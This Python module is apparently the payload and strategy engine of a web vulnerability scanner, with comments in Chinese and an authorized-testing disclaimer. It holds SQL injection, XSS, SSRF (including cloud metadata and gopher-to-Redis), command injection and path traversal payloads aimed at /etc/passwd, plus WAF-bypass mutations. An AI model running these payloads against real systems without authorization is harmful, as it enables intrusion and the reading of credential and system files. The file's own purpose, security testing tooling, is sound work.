"""
engine模块，提供相关安全测试功能。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import re
import random
import hashlib
import time
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import defaultdict, Counter
from utils.logger import log


@dataclass
class PayloadTemplate:
    """Payload模板"""
    type: str  # sqli/xss/ssrf/command_injection/...
    payload: str
    success_pattern: str  # 成功匹配的正则
    bypass_waf: bool = False
    effectiveness: float = 0.0  # 历史成功率
    usage_count: int = 0
    success_count: int = 0


@dataclass
class AnomalyScore:
    """异常评分"""
    score: float  # 0.0 - 1.0
    factors: Dict[str, float] = field(default_factory=dict)
    description: str = ""


class MLEngine:
    """机器学习增强引擎"""

    def __init__(self):
        """初始化MLEngine实例。

        Args:
            self: 类实例。
        """
        self.payload_templates: List[PayloadTemplate] = []
        self.scan_history: List[Dict] = []  # 历史扫描记录
        self.response_baseline: Dict[str, Dict] = {}  # 响应基线
        self.vulnerability_patterns: Dict[str, List[str]] = defaultdict(list)
        self._init_payload_templates()
        self._init_vulnerability_patterns()
        log.info("机器学习增强引擎初始化")

    def _init_payload_templates(self):
        """初始化Payload模板库"""
        templates = [
            # SQL注入
            PayloadTemplate("sqli", "' OR '1'='1", r"SQL syntax|mysql_fetch|ORA-|error in your SQL"),
            PayloadTemplate("sqli", "' UNION SELECT NULL--", r"SQL syntax|mysql_fetch|ORA-"),
            PayloadTemplate("sqli", "1' AND SLEEP(5)--", r"SQL syntax|mysql_fetch"),
            PayloadTemplate("sqli", "admin'--", r"SQL syntax|mysql_fetch|Welcome|admin"),
            PayloadTemplate("sqli", "' OR 1=1#", r"SQL syntax|mysql_fetch"),
            # XSS
            PayloadTemplate("xss", "<script>alert(1)</script>", r"<script>alert\(1\)</script>"),
            PayloadTemplate("xss", "<img src=x onerror=alert(1)>", r"onerror=alert\(1\)"),
            PayloadTemplate("xss", "<svg onload=alert(1)>", r"onload=alert\(1\)"),
            PayloadTemplate("xss", "javascript:alert(1)", r"javascript:alert\(1\)"),
            PayloadTemplate("xss", "\"><script>alert(1)</script>", r"<script>alert\(1\)</script>"),
            # SSRF
            PayloadTemplate("ssrf", "http://127.0.0.1", r"127\.0\.0\.1|localhost|root:x:0:0"),
            PayloadTemplate("ssrf", "http://169.254.169.254/latest/meta-data/", r"ami-id|computeMetadata|instance-id"),
            PayloadTemplate("ssrf", "file:///etc/passwd", r"root:x:0:0|/bin/bash"),
            PayloadTemplate("ssrf", "gopher://127.0.0.1:6379/_INFO", r"redis_version|# Server"),
            # 命令注入
            PayloadTemplate("command_injection", "; id", r"uid=\d+|gid=\d+|groups="),
            PayloadTemplate("command_injection", "| id", r"uid=\d+|gid=\d+"),
            PayloadTemplate("command_injection", "`id`", r"uid=\d+|gid=\d+"),
            PayloadTemplate("command_injection", "$(id)", r"uid=\d+|gid=\d+"),
            PayloadTemplate("command_injection", "&& whoami", r"root|admin|www-data"),
            # 目录穿越
            PayloadTemplate("path_traversal", "../../../etc/passwd", r"root:x:0:0|/bin/bash"),
            PayloadTemplate("path_traversal", "..\\..\\..\\windows\\win.ini", r"\\[fonts\\]|\\[extensions\\]"),
            PayloadTemplate("path_traversal", "%2e%2e%2f%2e%2e%2fetc/passwd", r"root:x:0:0"),
        ]
        self.payload_templates = templates

    def _init_vulnerability_patterns(self):
        """初始化漏洞预测模式"""
        self.vulnerability_patterns = {
            "php": ["sqli", "xss", "file_upload", "command_injection", "path_traversal"],
            "java": ["sqli", "xxe", "ssrf", "deserialization"],
            "asp.net": ["sqli", "xss", "viewstate", "path_traversal"],
            "node.js": ["xss", "ssrf", "prototype_pollution", "nosql_injection"],
            "python": ["sqli", "xss", "ssrf", "template_injection"],
            "nginx": ["path_traversal", "ssrf", "header_injection"],
            "apache": ["path_traversal", "ssrf", "http_request_smuggling"],
            "iis": ["path_traversal", "http_request_smuggling", "asp_dotnet"],
        }

    def generate_smart_payload(self, vuln_type: str, target_context: Dict = None,
                                bypass_waf: bool = False, count: int = 5) -> List[str]:
        """
        智能Payload生成
        vuln_type: 漏洞类型
        target_context: 目标上下文（技术栈、WAF信息等）
        bypass_waf: 是否需要WAF绕过
        count: 生成数量
        """
        # 筛选匹配类型的Payload
        candidates = [p for p in self.payload_templates if p.type == vuln_type]
        if not candidates:
            log.warning(f"未找到漏洞类型的Payload: {vuln_type}")
            return []

        # 按有效性排序
        candidates.sort(key=lambda p: p.effectiveness, reverse=True)

        # WAF绕过变异
        if bypass_waf:
            mutated = []
            for p in candidates[:count]:
                mutated.extend(self._mutate_payload_for_waf(p.payload))
            return mutated[:count]

        return [p.payload for p in candidates[:count]]

    def _mutate_payload_for_waf(self, payload: str) -> List[str]:
        """WAF绕过Payload变异"""
        mutations = [payload]

        # 大小写混合
        mutations.append(payload.swapcase())

        # 注释注入
        if "<script>" in payload:
            mutations.append(payload.replace("<script>", "<scr<!-- -->ipt>"))

        # URL编码
        mutations.append(payload.replace("'", "%27").replace('"', "%22").replace("<", "%3c").replace(">", "%3e"))

        # Unicode编码
        mutations.append(payload.replace("'", "\u0027").replace("<", "\u003c"))

        # 双写绕过
        if "script" in payload:
            mutations.append(payload.replace("script", "scscriptript"))

        return list(set(mutations))

    def detect_anomaly(self, response: Dict, baseline: Optional[Dict] = None) -> AnomalyScore:
        """
        异常检测
        response: 响应数据（status_code, body, headers, response_time等）
        baseline: 基线响应
        """
        factors = {}
        total_score = 0.0

        # 1. 状态码异常
        status = response.get("status_code", 0)
        if status >= 500:
            factors["server_error"] = 0.8
            total_score += 0.8
        elif status == 403:
            factors["forbidden"] = 0.3
            total_score += 0.3

        # 2. 响应时间异常
        response_time = response.get("response_time", 0)
        if baseline and baseline.get("response_time"):
            baseline_time = baseline["response_time"]
            if response_time > baseline_time * 5 and response_time > 2:
                factors["time_delay"] = min(1.0, response_time / 10)
                total_score += factors["time_delay"]

        # 3. 响应长度异常
        body_length = len(response.get("body", ""))
        if baseline and baseline.get("body_length"):
            baseline_length = baseline["body_length"]
            if baseline_length > 0:
                ratio = body_length / baseline_length
                if ratio > 3 or ratio < 0.1:
                    factors["length_anomaly"] = min(1.0, abs(1 - ratio) / 2)
                    total_score += factors["length_anomaly"]

        # 4. 错误信息检测
        body = response.get("body", "").lower()
        error_patterns = ["sql syntax", "mysql", "ora-", "postgresql", "sqlite",
                          "traceback", "exception", "stack trace", "fatal error",
                          "warning", "deprecated", "notice: undefined"]
        for pattern in error_patterns:
            if pattern in body:
                factors[f"error_{pattern}"] = 0.5
                total_score += 0.5
                break

        # 5. 敏感信息泄露
        sensitive_patterns = [r"password\s*[:=]\s*\w+", r"api[_-]?key\s*[:=]\s*\w+",
                               r"secret\s*[:=]\s*\w+", r"token\s*[:=]\s*\w+",
                               r"-----BEGIN", r"DB_PASSWORD", r"AWS_SECRET"]
        for pattern in sensitive_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                factors["sensitive_info"] = 0.9
                total_score += 0.9
                break

        # 归一化
        final_score = min(1.0, total_score)
        description = "正常" if final_score < 0.3 else "轻微异常" if final_score < 0.6 else "显著异常" if final_score < 0.8 else "严重异常"

        return AnomalyScore(score=round(final_score, 2), factors=factors, description=description)

    def predict_vulnerabilities(self, target_features: Dict) -> List[Dict]:
        """
        漏洞预测
        target_features: 目标特征（技术栈、服务器、框架、端口等）
        """
        predictions = []
        tech_stack = target_features.get("tech_stack", [])
        server = target_features.get("server", "").lower()
        framework = target_features.get("framework", "").lower()
        open_ports = target_features.get("open_ports", [])

        # 基于技术栈预测
        for tech in tech_stack:
            tech_lower = tech.lower()
            for pattern_key, vulns in self.vulnerability_patterns.items():
                if pattern_key in tech_lower:
                    for vuln in vulns:
                        predictions.append({
                            "vulnerability": vuln,
                            "confidence": 0.6,
                            "reason": f"基于技术栈 {tech} 预测",
                        })

        # 基于服务器预测
        for pattern_key, vulns in self.vulnerability_patterns.items():
            if pattern_key in server:
                for vuln in vulns:
                    predictions.append({
                        "vulnerability": vuln,
                        "confidence": 0.5,
                        "reason": f"基于服务器 {server} 预测",
                    })

        # 基于端口预测
        port_vuln_map = {
            21: "ftp_anonymous", 22: "ssh_weak_auth", 23: "telnet_cleartext",
            25: "smtp_relay", 53: "dns_zone_transfer", 80: "http_misconfig",
            139: "smb_null_session", 445: "smb_eternal_blue",
            3306: "mysql_weak_auth", 3389: "rdp_bluekeep",
            5432: "postgres_weak_auth", 6379: "redis_unauth",
            8080: "tomcat_manager", 8443: "https_misconfig",
            27017: "mongodb_unauth", 9200: "elasticsearch_unauth",
        }
        for port in open_ports:
            if port in port_vuln_map:
                predictions.append({
                    "vulnerability": port_vuln_map[port],
                    "confidence": 0.4,
                    "reason": f"基于开放端口 {port} 预测",
                })

        # 去重并按置信度排序
        seen = set()
        unique_predictions = []
        for p in predictions:
            key = p["vulnerability"]
            if key not in seen:
                seen.add(key)
                unique_predictions.append(p)
            else:
                # 合并置信度（取最高）
                for up in unique_predictions:
                    if up["vulnerability"] == key:
                        up["confidence"] = max(up["confidence"], p["confidence"])
                        up["reason"] += "; " + p["reason"]

        unique_predictions.sort(key=lambda x: x["confidence"], reverse=True)
        return unique_predictions

    def generate_scan_strategy(self, target_info: Dict) -> Dict:
        """
        生成智能扫描策略
        target_info: 目标信息
        """
        # 预测漏洞
        predictions = self.predict_vulnerabilities(target_info)

        # 按预测的漏洞类型生成Payload
        payloads_by_type = {}
        for p in predictions[:5]:
            vuln_type = p["vulnerability"]
            payloads = self.generate_smart_payload(vuln_type, count=3)
            if payloads:
                payloads_by_type[vuln_type] = payloads

        # 确定扫描顺序（高置信度优先）
        scan_order = [p["vulnerability"] for p in predictions[:10]]

        strategy = {
            "target": target_info.get("target", ""),
            "predicted_vulnerabilities": predictions[:10],
            "scan_order": scan_order,
            "payloads": payloads_by_type,
            "recommended_tools": self._recommend_tools(predictions),
            "estimated_time": len(predictions) * 30,  # 每个漏洞30秒
            "risk_level": "high" if any(p["confidence"] > 0.7 for p in predictions) else "medium",
        }

        log.info(f"智能扫描策略已生成: {strategy['risk_level']}风险, {len(predictions)}个预测漏洞")
        return strategy

    def _recommend_tools(self, predictions: List[Dict]) -> List[str]:
        """根据预测漏洞推荐工具"""
        vuln_tools = {
            "sqli": ["sql_injection_test", "directory_scan"],
            "xss": ["xss_test", "browser_navigate"],
            "ssrf": ["ssrf_test", "http_headers"],
            "command_injection": ["command_injection_test"],
            "path_traversal": ["directory_scan", "file_upload_test"],
            "file_upload": ["file_upload_test"],
            "xxe": ["xxe_test"],
            "idor": ["idor_test"],
        }
        recommended = set()
        for p in predictions:
            vuln = p["vulnerability"]
            if vuln in vuln_tools:
                recommended.update(vuln_tools[vuln])
        return list(recommended)

    def record_scan_result(self, target: str, vuln_type: str, payload: str,
                           success: bool, response: Dict = None):
        """记录扫描结果，用于模型优化"""
        record = {
            "target": target, "vuln_type": vuln_type, "payload": payload,
            "success": success, "timestamp": time.time(),
            "response_status": response.get("status_code") if response else None,
        }
        self.scan_history.append(record)

        # 更新Payload有效性
        for p in self.payload_templates:
            if p.payload == payload:
                p.usage_count += 1
                if success:
                    p.success_count += 1
                p.effectiveness = p.success_count / p.usage_count if p.usage_count > 0 else 0
                break

        # 只保留最近10000条
        if len(self.scan_history) > 10000:
            self.scan_history = self.scan_history[-10000:]

    def get_stats(self) -> Dict:
        """获取ML引擎统计"""
        return {
            "payload_templates": len(self.payload_templates),
            "scan_history": len(self.scan_history),
            "vulnerability_patterns": len(self.vulnerability_patterns),
            "avg_payload_effectiveness": round(
                sum(p.effectiveness for p in self.payload_templates) / len(self.payload_templates), 2
            ) if self.payload_templates else 0,
            "success_rate": round(
                sum(1 for r in self.scan_history if r["success"]) / len(self.scan_history) * 100, 2
            ) if self.scan_history else 0,
        }


# 全局ML引擎实例
ml_engine = MLEngine()
